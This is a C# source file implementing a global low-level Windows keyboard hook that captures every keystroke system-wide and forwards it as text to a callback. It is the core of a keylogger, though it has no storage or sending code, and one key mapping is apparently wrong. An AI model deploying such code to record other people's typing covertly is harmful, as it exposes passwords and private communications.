using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using static KeyboardHooks.Fimport;
namespace KeyboardHooks
{
    public static class HookHandler
    {
        private static string shift_comd = "";
        private static string key_oem = "";
        private static IntPtr hookID = IntPtr.Zero;
        public static Action<string> _callBackFunct;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private static readonly LowLevelKeyboardProc CallBack = HookCallback;
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int keyCode = Marshal.ReadInt32(lParam);
                KeysConverter kc = new KeysConverter();
                string mystring = kc.ConvertToString((Keys)keyCode);
                if (wParam == (IntPtr)WM_KEYDOWN) 
                {
                    switch ((Keys)keyCode)
                    {
                        case Keys.OemMinus:
                            key_oem = "-";
                            _callBackFunct(key_oem);
                            break;
                        case Keys.Multiply:
                            key_oem = "*";
                            _callBackFunct(key_oem);
                            break;
                        case Keys.Capital:
                            key_oem = "caps lock";
                            _callBackFunct(key_oem);
                            break;
                        case Keys.Divide:
                            key_oem = "/";
                            _callBackFunct(key_oem);
                            break;
                        case Keys.Oemplus:
                            key_oem = "=";
                            _callBackFunct(key_oem);
                            break;
                        case Keys.Oemcomma:
                            key_oem = ",";
                            _callBackFunct(key_oem);
                            break;
                        case Keys.OemOpenBrackets:
                            key_oem = "[";
                            _callBackFunct(key_oem);
                            break;
                        case Keys.Oem6:
                            key_oem = "]";
                            _callBackFunct(key_oem);
                            break;
                        case Keys.Oem5:
                            key_oem = "\\";
                            _callBackFunct(key_oem);
                            break;
                        case Keys.Oem1:
                            key_oem = ";";
                            _callBackFunct(key_oem);
                            break;
                        case Keys.Oem7:
                            key_oem = "'";
                            _callBackFunct(key_oem);
                            break;
                        case Keys.OemQuestion:
                            key_oem = "'";
                            _callBackFunct(key_oem);
                            break;
                        case Keys.OemPeriod:
                            key_oem = ".";
                            _callBackFunct(key_oem);
                            break;
                        default:
                            _callBackFunct(mystring);
                            break;
                    }
                }
                if (wParam == (IntPtr) WM_KEYUP)
                {
    
                    if (Keys.Oemcomma == (Keys)keyCode && Keys.Shift == Control.ModifierKeys)
                    {
                        shift_comd = "<";
                        _callBackFunct(shift_comd);
                    }
                    if (Keys.OemPeriod == (Keys) keyCode && Keys.Shift == Control.ModifierKeys)
                    {
                        shift_comd = ">";
                        _callBackFunct(shift_comd);
                    }
                    if (Keys.LShiftKey == (Keys)keyCode && Keys.Shift == Control.ModifierKeys)
                    {
                        shift_comd = "(Отпустил)LShift";
                        _callBackFunct(shift_comd);
                    }

                }



            }
            return CallNextHookEx(hookID, nCode, wParam, lParam);
        }

        public static void SetHook()
        {

            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                hookID  = SetWindowsHookEx(WH_KEYBOARD_LL, CallBack, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        public static void RemoveHook()
        {
            UnhookWindowsHookEx(hookID);
        }
    }
}
